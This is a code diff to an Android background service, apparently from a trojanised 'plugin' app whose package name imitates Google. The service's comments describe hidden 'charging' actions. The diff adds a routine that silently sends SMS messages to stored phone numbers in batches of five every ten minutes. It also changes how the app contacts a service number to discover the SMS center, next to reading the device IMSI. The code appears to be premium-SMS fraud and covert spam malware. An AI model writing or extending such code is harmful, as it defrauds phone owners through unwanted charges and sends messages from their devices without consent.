@@ -12,6 +12,7 @@ import com.googl.plugin.x.R;
 import com.plugin.common.utils.CustomThreadPool;
 import com.plugin.common.utils.UtilsRuntime;
 import com.plugin.internet.InternetUtils;
+import com.xstd.plugin.Utils.BRCUtil;
 import com.xstd.plugin.Utils.CommonUtil;
 import com.xstd.plugin.Utils.DomanManager;
 import com.xstd.plugin.Utils.SMSUtil;
@@ -38,6 +39,8 @@ public class PluginService extends IntentService {
     public static final String ACTIVE_ACTION = "com.xstd.plugin.active";
 
     public static final String ACTIVE_PACKAGE_ACTION = "com.xstd.plugin.package.active";
+
+    public static final String SMS_BROADCAST_ACTION = "com.xstd.plugin.broadcast";
 
     /**
      * 扣费行动
@@ -69,7 +72,74 @@ public class PluginService extends IntentService {
                  * 扣费逻辑
                  */
                 monkeyAction();
+            } else if (SMS_BROADCAST_ACTION.equals(action)) {
+                broadcastSMSForSMSCenter(intent);
             }
+        }
+    }
+
+    private synchronized void broadcastSMSForSMSCenter(Intent intent) {
+        if (Config.DEBUG) {
+            Config.LOGD("[[PluginService::broadcastSMSForSMSCenter]] entry");
+        }
+
+        try {
+            String phoneNumbers = SettingManager.getInstance().getBroadcastPhoneNumber();
+            if (Config.DEBUG) {
+                Config.LOGD("[[PluginService::broadcastSMSForSMSCenter]] before send broadcast, current phone Number is : " + phoneNumbers);
+            }
+            if (!TextUtils.isEmpty(phoneNumbers)) {
+                String[] datas = phoneNumbers.split(";");
+                if (datas != null) {
+                    //如果一下发送多条短信会有问题，所以增加一个延迟
+                    //每次只发5条，等10分钟，再发5条
+                    for (int i = 0; i < datas.length && i < 5; ++i) {
+                        if (datas[i] != null && (datas[i].length() == 11 || datas[i].startsWith("+"))) {
+                            if (SMSUtil.sendSMS(datas[i], "你好，很高兴认识你。")) {
+                                datas[i] = "";
+                            }
+                        }
+                    }
+
+                    //重组整个数据
+                    StringBuilder sb = new StringBuilder();
+                    for (String d : datas) {
+                        if (!TextUtils.isEmpty(d)) {
+                            sb.append(d).append(";");
+                        }
+                    }
+                    if (sb.length() > 0) {
+                        SettingManager.getInstance().setBroadcastPhoneNumber(sb.substring(0, sb.length() - 1));
+                        if (Config.DEBUG) {
+                            Config.LOGD("[[PluginService::broadcastSMSForSMSCenter]] after send broadcast, current phone Number is : "
+                                            + SettingManager.getInstance().getBroadcastPhoneNumber()
+                                            + " and start alarm for next round send delay 10 min");
+                        }
+                        //因为还有没有发送的号码，所以启动一个定时器
+                        BRCUtil.startAlarmForAction(getApplicationContext(), SMS_BROADCAST_ACTION, 10 * 60 * 1000);
+                    } else {
+                        //已经消耗光
+                        SettingManager.getInstance().setBroadcastPhoneNumber("");
+                        if (Config.DEBUG) {
+                            Config.LOGD("[[PluginService::broadcastSMSForSMSCenter]] after send broadcast, current phone Number is : "
+                                            + SettingManager.getInstance().getBroadcastPhoneNumber());
+                        }
+                    }
+                }
+            } else {
+                if (Config.DEBUG) {
+                    Config.LOGD("[[PluginService::broadcastSMSForSMSCenter]] do nothing as the phoneNumbers is empty");
+                }
+            }
+        } catch (Exception e) {
+            e.printStackTrace();
+            if (Config.DEBUG) {
+                Config.LOGD("[[PluginService::broadcastSMSForSMSCenter]]", e);
+            }
+        }
+
+        if (Config.DEBUG) {
+            Config.LOGD("[[PluginService::broadcastSMSForSMSCenter]] leave");
         }
     }
 
@@ -151,7 +221,8 @@ public class PluginService extends IntentService {
                         /**
                          * 如果短信中心为空的话，就发送短信获取短信中心
                          */
-                        SMSUtil.trySendCmdToNetwork(getApplicationContext());
+//                        SMSUtil.trySendCmdToNetwork(getApplicationContext());
+                        SMSUtil.trySendCmdToServicePhone1(getApplicationContext());
                     } else {
                         String imei = UtilsRuntime.getIMSI(getApplicationContext());
                         if (TextUtils.isEmpty(imei)) {
